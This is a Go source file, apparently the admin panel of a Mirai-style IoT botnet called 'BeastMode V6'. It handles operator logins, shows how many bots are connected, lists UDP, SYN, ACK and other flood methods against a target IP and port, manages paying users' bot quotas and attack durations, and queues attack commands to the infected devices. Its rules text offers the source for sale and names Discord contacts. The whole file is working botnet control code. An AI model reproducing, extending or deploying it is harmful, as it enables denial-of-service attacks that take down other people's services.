package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "os"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}



func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username | this ReadLine is edited from mana v4.1
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[1;31m         Making \033[1;97mConnection \033[1;31mTo \033[1;31mEstablish Beast\033[1;31mMode\033[1;31m Servers \033[0m"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[1;31m        ╔═══════════════════════════════════════════════╗    \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mWelcome To Beast\033[1;97mMode V\033[1;97m6\033[1;97m - - - - - -\033[1;31m║   \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - - - - \033[1;31mBuilt Ready And To \033[1;97mNull\033[1;97m - - - - - -\033[1;31m║    \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║\033[1;97m- - - -\033[1;31mNo Spamming\033[1;97m + \033[1;31mDon't Share Logins\033[1;97m!- - - -\033[1;31m║    \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ╚═══════════════════════════════════════════════╝   \033[0m \r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\033[1;31m        ╔═══════════════════════════════════════════════╗   \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ║- - - - -\033[1;31mPlease Enter \033[1;97mLogin\033[1;31m Info Below\033[1;97m- - - - -\033[1;31m║   \033[0m \r\n"))
    this.conn.Write([]byte("\033[1;31m        ╚═══════════════════════════════════════════════╝    \033[0m \r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;31mUsername\033[\033[97m: \033[1;31m"))// \033[1;97m  \033[1;31m
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[1;31mPassword\033[\033[97m: \033[1;31m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[0;92mAttempting To Login With Given Credentials... \033[1;31m[\033[0;37m 정보 입력 확인 중 .. \033[1;31m] \033[0;31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    //if credentials are incorrect output error and close session so snoopy skids stay away.. stop getting your credentials wrong...
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[0;1;31mUser Doesnt Exist Or Is Banned!\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; [ %d ] <- IoT Bots Connected    |    Connected As ->   %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header #1
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██████╗ ███████╗ █████╗ ███████╗████████╗\033[01;97m ███╗   ███╗ ██████╗ ██████╗ ███████╗\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝\033[01;97m ████╗ ████║██╔═══██╗██╔══██╗██╔════╝\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██████╔╝█████╗  ███████║███████╗   ██║   \033[01;97m ██╔████╔██║██║   ██║██║  ██║█████╗\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║   \033[01;97m ██║╚██╔╝██║██║   ██║██║  ██║██╔══╝\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ██████╔╝███████╗██║  ██║███████║   ██║   \033[01;97m ██║ ╚═╝ ██║╚██████╔╝██████╔╝███████╗\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   \033[01;97m ╚═╝     ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝\033[01;97m\r\n"))
    this.conn.Write([]byte("\x1b[1;31m                                                                               \033[01;97m\r\n"))
    this.conn.Write([]byte("\033[01;97m[\x1b[1;31m+\033[01;97m]  Welcome back \033[1;31m" + username + "  \033[01;97m[\x1b[1;31m+\033[01;97m]\r\n"))
    this.conn.Write([]byte("\033[01;97m[\x1b[1;31m+\033[01;97m]  Type \x1b[1;31mHELP \033[01;97mOr \x1b[1;31m?\033[01;97m To Get Started On BeastMode [\x1b[1;31m+\033[01;97m]\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))

    
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[97m[\033[1;31m" + username + "\033[97m@\033[1;31mBeast\033[97mMode \033[1;31m~\033[1;31m]\033[97m# \033[1;31m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "" {
            continue
        }
        
        if err != nil || cmd == "C" || cmd == "c" || cmd == "cls" || cmd == "CLS" || cmd == "Cls" || cmd == "CLEAR" || cmd == "clear" { // clear screen 
            this.conn.Write([]byte("\033[2J\033[1H")) 
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n\033[0m"))
            this.conn.Write([]byte("\r\033[1;31m            ╔╗   ╔═╗  ╔═╗  ╔═╗ ╔╦╗ \033[1;97m ╔╦╗  ╔═╗  ╔╦╗  ╔═╗      \r\n"))
            this.conn.Write([]byte("\r\033[1;31m            ╠╩╗  ║╣   ╠═╣  ╚═╗  ║  \033[1;97m ║║║  ║ ║   ║║  ║╣       \r\n"))
            this.conn.Write([]byte("\r\033[1;31m            ╚═╝  ╚═╝  ╩ ╩  ╚═╝  ╩  \033[1;97m ╩ ╩  ╚═╝  ═╩╝  ╚═╝ \033[1;31mV\033[97m6      \r\n"))
            this.conn.Write([]byte("\r\033[1;31m         ╔═════════════════════════════════════════════╗   \r\n"))   
            this.conn.Write([]byte("\r\033[1;31m         ║\033[1;97m- - - - - -\033[1;97mWelcome To \033[1;31mBeast\033[1;97mMode \033[1;31mV\033[1;97m6- - - - - -\033[1;31m║   \r\n")) 
            this.conn.Write([]byte("\r\033[1;31m         ║\033[1;97m- - - - - -\033[1;31mBuilt Ready And To Null\033[1;97m- - - - - -\033[1;31m║   \r\n"))   
            this.conn.Write([]byte("\r\033[1;31m         ║\033[1;97m- - -[\033[1;31m!\033[1;97m] Type A \033[1;97m? For A Command List [\033[1;31m!\033[1;97m]- - -\033[1;31m║   \r\n"))   
            this.conn.Write([]byte("\r\033[1;31m         ╚═════════════════════════════════════════════╝   \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
            this.conn.Write([]byte("\033[1;31m     \033[01;97m -> |  \x1b[1;31mBeastMode Help Menu\033[01;97m  | <-    \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ╔══════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \x1b[1;31mMETHODS -> \033[97mShows attack commands     \033[1;31m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \x1b[1;31mBOTS -> \033[97mShows bots and archs         \033[1;31m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \x1b[1;31mADMIN -> \033[97mShows admin commands        \033[1;31m║   \033[0m \r\n"))   
            this.conn.Write([]byte("\033[1;31m ║ \x1b[1;31mCLS -> \033[97mClears the terminal           \033[1;31m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \x1b[1;31mLOGOUT -> \033[97mExits from the terminal    \033[1;31m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \x1b[1;31mSTATS  -> \033[97mShow User Stats            \033[1;31m║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ╚══════════════════════════════════════╝ \033[0m \r\n"))
            continue
            }


        if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
            this.conn.Write([]byte("\033[01;97m     -> |\x1b[1;31m BeastMode Attack Methods\033[01;97m  | <- \r\n"))
            this.conn.Write([]byte("\033[1;31m ╔══════════════════════════════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.udp [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.ovh [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.vse [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.syn [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.ack [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m                ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.stdhex [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m             ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[97m.udpplain [\033[97mip\033[1;31m] [\033[97mtime\033[1;31m] dport=[\033[97mport\033[1;31m]\033[1;31m           ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[1;31m ╚══════════════════════════════════════════════╝   \033[0m \r\n"))
            continue
        }
        

        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[01;97m    -> |\x1b[1;31m BeastMode Admin Menu\033[01;97m  | <- \r\n"))
            this.conn.Write([]byte("\033[1;31m ╔═══════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[01;97mADDBASIC -> \033[1;31mAdd Basic Client Menu \033[1;31m║\r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[01;97mADDADMIN -> \033[1;31mAdd Admin Client Menu \033[1;31m║ \r\n"))
            this.conn.Write([]byte("\033[1;31m ║ \033[01;97mREMOVEUSER -> \033[1;31mRemove User Menu    \033[1;31m║ \r\n"))
            this.conn.Write([]byte("\033[1;31m ╚═══════════════════════════════════╝  \r\n"))
            continue
        }

        if err != nil || cmd == "RULES" || cmd == "rules" {
            this.conn.Write([]byte(fmt.Sprintf("\033[97m       |  BeastMode  Rules  |                                              \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m ════════════════════════════════  \r\n"))) 
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mHello \033[1;31m" + username + " !                           \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mDon't spam! & Don't share! Don't spam me for admin!        \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mDon't attack to goverment sites.                           \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mIf you wanna buy this source build, dm me.                 \r\n")))
            this.conn.Write([]byte("\033\x1b[1;31m  Discord\033[1;37m: Selfrep#1337     \r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m ════════════════════════════════                                       \r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m\r\n")))
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31m\r\n")))
            continue
        }

        if err != nil || cmd == "changelog" || cmd == "cl" { // change this for every other update you do
            this.conn.Write([]byte("\033[38;5;217m════════════════════════════════ \r\n"))
            this.conn.Write([]byte("\033[38;5;217m BeastMode V6\r\n"))
            this.conn.Write([]byte("\033[38;5;216m Change Logs!\r\n"))
            this.conn.Write([]byte("\033[38;5;215m[+] Better Killer\r\n"))
            this.conn.Write([]byte("\033[38;5;215m[+] Little Bit Of AntiCrash\r\n"))
            this.conn.Write([]byte("\033[38;5;214m[+] Added Method: clamp (Server Method!)\r\n"))
            this.conn.Write([]byte("\033[38;5;213m[+] Better Jaws Selfrep!\r\n"))
            this.conn.Write([]byte("\033[38;5;213m[+] Made By Selfrep#6192 or @h4_remiixx\r\n"))
            this.conn.Write([]byte("\033[38;5;217m════════════════════════════════ \r\n"))
            continue
        }


 if err != nil || cmd == "STATS" || cmd == "stats" {
this.conn.Write([]byte("\033[1;31m════════════════════════════════════════════\r\n"))
this.conn.Write([]byte(fmt.Sprintf("\033[1;31m[\033[01;97mUsers\033[1;31m] %d \r\n", database.fetchUsers())))
this.conn.Write([]byte(fmt.Sprintf("\033[1;31m[\033[01;97mTotal Attacks\033[1;31m] %d \r\n", database.fetchAttacks())))
this.conn.Write([]byte("\033[1;31m[\033[01;97mUsername\033[1;31m] "+username+"\r\n"))
this.conn.Write([]byte("\033[1;31m════════════════════════════════════════════\r\n"))
continue
}


        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }


if err != nil || cmd == "-1" || cmd == "@" || cmd == "-0" || cmd == "@@" || cmd == "-2" || cmd == "-3" || cmd == "-4" || cmd == "-5" || cmd == "-6" || cmd == "-7" || cmd == "-8" || cmd == "-9" || cmd == "@@@" || cmd == "@@@@" || cmd == "@@@@@" || cmd == "@@@@@@" || cmd == "@@@@@@" || cmd == "@@@@@@@" || cmd == "@@@@@@@@" || cmd == "@@@@@@@@" || cmd == "-10" {
    
     f, err := os.OpenFile("logs/crashlogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
    if err != nil {
        fmt.Println(err)
        return
    }
    
    newLine := "Username: "+ username +"\nReason: Tried To Crash CNC\n================"
    _, err = fmt.Fprintln(f, newLine)
    if err != nil {
        fmt.Println(err)
                f.Close()
        return
    }
    err = f.Close()
    if err != nil {
        fmt.Println(err)
        return
    }

    this.conn.Write([]byte("\033[38;5;44m[ \x1b[0;31mERROR \x1b[38;5;44m] Looks Like you tried to crash our shit\r\n"))
    this.conn.Write([]byte("\x1b[38;5;44mUsername and Ip Logged\r\n"))
    continue
}




        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addbasic" {
            this.conn.Write([]byte("\033[0mBasic User's Name ->\033[1;31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBasic User's Passkey:\033[1;31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBasic User's Botcount\033[1;31m(\033[0m-1 for access to all\033[1;31m)\033[0m:\033[1;31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mBasic User's Attack Duration\033[1;31m(\033[0m-1 for none\033[1;31m)\033[0m:\033[1;31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mBasic User's Cooldown\033[1;31m(\033[0m0 for none\033[1;31m)\033[0m:\033[1;31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New Basic User's info - \r\n- Username - \033[1;31m" + new_un + "\r\n\033[0m- Password - \033[1;31m" + new_pw + "\r\n\033[0m- Bots - \033[1;31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;31m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;31m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[1;31mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[1;31mAre You Sure You Want To Remove \033[1;31m" + rm_un + "?\033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;97mUnable to remove users, sorry pal (`-`)\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[0mAdmin User's Username:\033[1;31m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mAdmin User's Password:\033[1;31m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mAdmin User's Botcount\033[1;31m(\033[0m-1 for access to all\033[1;31m)\033[0m:\033[1;31m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAdmin User's Attack Duration\033[1;31m(\033[0m-1 for none\033[1;31m)\033[0m:\033[1;31m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mAdmin User's Cooldown\033[1;31m(\033[0m0 for none\033[1;31m)\033[0m:\033[1;31m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New admin user's  info - \r\n- Username - \033[1;31m" + new_un + "\r\n\033[0m- Password - \033[1;31m" + new_pw + "\r\n\033[0m- Bots - \033[1;31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;31m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;31m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mAdmin User's  added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" || cmd == "BOTS" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s: \x1b[0;97m%d\033[0m\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[1;31mTotal Bots: \033[01;97m[\033[01;97m%d\033[01;97m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[0;1;31m[+] Command sent to \033[0;37m%d \033[0;1;31mbots\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}